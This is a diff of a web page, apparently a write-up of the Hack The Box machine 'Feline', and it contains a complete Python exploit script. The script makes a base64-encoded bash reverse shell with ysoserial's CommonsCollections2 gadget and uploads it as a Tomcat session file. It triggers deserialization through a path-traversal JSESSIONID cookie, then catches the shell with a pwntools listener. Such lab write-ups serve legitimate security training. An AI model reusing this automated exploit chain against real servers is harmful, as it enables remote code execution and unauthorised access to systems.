@@ -83,71 +83,83 @@ body {
 	 
 <h4><i>User.py</i></h4>																						
 <pre>
-	#!/usr/bin/python3
+#!/usr/bin/python3
 
-	import base64
-	from pwn import *
-	from termcolor import colored
+import base64, random
+import netifaces as ni
+from pwn import *
+from termcolor import colored
 
-	my_ip = "10.10.14.254"
-	my_port = "9000"
-	ysoserial_path = '/opt/ysoserial-master-6eca5bc740-1.jar'
-	upload_url = 'http://feline.htb:8080/upload.jsp'
+ysoserial_path = '/opt/ysoserial-master-6eca5bc740-1.jar'
+upload_url = 'http://feline.htb:8080/upload.jsp'
 
+def main():
 
-	# Helper func to generate random filename
-	def get_random_string(length):
-    		letters = string.ascii_lowercase
-    		result_str = ''.join(random.choice(letters) for i in range(length))
-    		return result_str
+    # Set IP, Port, and filename
+    (my_ip, my_port, fname) = get_vars()
+    print(colored('\n[+] Setting exploit info\n\t my_ip = ' + my_ip +'\n\t my_port = ' + my_port + '\n', 'red'))
 
+    # Create our .session file with JRE command from -- http://jackson-t.ca/runtime-exec-payloads.html
+    cmd = base64.b64encode(bytes('bash -i >& /dev/tcp/' + my_ip + '/' + my_port + ' 0>&1', 'utf-8')).decode('ascii')
+    jre_cmd = 'bash -c {echo,' + cmd + '}|{base64,-d}|{bash,-i}'
+    serialize_cmd = 'java -jar ' + ysoserial_path + ' CommonsCollections2 ' + '\"' + jre_cmd + '\" > ' + fname + '.session'
+    run_bash(serialize_cmd)
 
-	# Helper func to run bash
-	def run_bash(cmd):
-    		print(colored('\n' + str(cmd), 'green')) 
-    		p = process(cmd, shell=True)
-    		err = p.recvall()
-    		exit_code = p.poll()
-    		if exit_code == 0:
-        		print(colored('[+] Success', 'green'))
-        		print('\n')
-    		else:
-        		print(colored('[-] Failed with exit code ' + str(exit_code), 'red'))
+    # Attempt to upload payload
+    cmd = 'curl -sS ' + '\'' + upload_url + '\'' + ' -F \"image=@' + fname + '.session\" > /dev/null' 
+    run_bash(cmd)
 
+    # Startup pwntools listener
+    print(colored('Starting nc listener', 'green'))
+    l = listen(my_port)
+    print(colored('[+] Success', 'green'))
 
-	# Generate a random 6 character filename to use
-	fname = get_random_string(6).capitalize()
+    # Execute payload
+    cmd = 'curl -sS ' + '\'' + upload_url + '\'' + ' -H \"Cookie: JSESSIONID=../../../opt/samples/uploads/' + fname + '\" > /dev/null'
+    run_bash(cmd)
 
-
-	# Create our .session file with JRE command from -- http://jackson-t.ca/runtime-exec-payloads.html
-	cmd = 'bash -i >& /dev/tcp/' + my_ip + '/' + my_port + ' 0>&1'
-	b = bytes(cmd, 'utf-8')
-	enc = base64.b64encode(b)
-	encoded = enc.decode('ascii')
-	jre_cmd = 'bash -c {echo,' + encoded + '}|{base64,-d}|{bash,-i}'
-	serialize_cmd = 'java -jar ' + ysoserial_path + ' CommonsCollections2 ' + '\"' + jre_cmd + '\" > ' + fname + '.session'
-	run_bash(serialize_cmd)
+    # Interact with our listener
+    print(colored('\nInteracting with low priv shell...', 'red'))
+    l.interactive()
 
 
-	# Attempt to upload payload
-	cmd = 'curl -sS ' + '\'' + upload_url + '\'' + ' -F \"image=@' + fname + '.session\" > /dev/null' 
-	run_bash(cmd)
+
+# Set the following variables
+#   my_ip   -> HTB tun0 IP
+#   my_port -> random port between 9000-9500
+#   fname   -> random 6 letter filename
+def get_vars():
+    ni.ifaddresses('tun0')
+    ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
+    port = random.randrange(9000, 9500, 1)
+    letters = string.ascii_lowercase
+    fname = ''.join(random.choice(letters) for i in range(6))
+    return (str(ip), str(port), str(fname))
 
 
-	# Startup pwntools listener
-	print(colored('Starting nc listener', 'green'))
-	l = listen(my_port)
-	print(colored('[+] Success', 'green'))
+# Helper func to generate random filename
+def get_random_string(length):
+    letters = string.ascii_lowercase
+    result_str = ''.join(random.choice(letters) for i in range(length))
+    return result_str
 
 
-	# Execute payload
-	cmd = 'curl -sS ' + '\'' + upload_url + '\'' + ' -H \"Cookie: JSESSIONID=../../../opt/samples/uploads/' + fname + '\" > /dev/null'
-	run_bash(cmd)
+# Helper func to run bash commands in a pwntools process
+def run_bash(cmd):
+    print(colored('\n' + str(cmd), 'green')) 
+    p = process(cmd, shell=True)
+    err = p.recvall()
+    exit_code = p.poll()
+    if exit_code == 0:
+        print(colored('[+] Success', 'green'))
+        print('\n')
+    else:
+        print(colored('[-] Failed with exit code ' + str(exit_code), 'red'))
 
 
-	# Interact with our listener
-	l.interactive()
-	</pre>
+main()
+
+</pre>
 	 
 	 
 	 
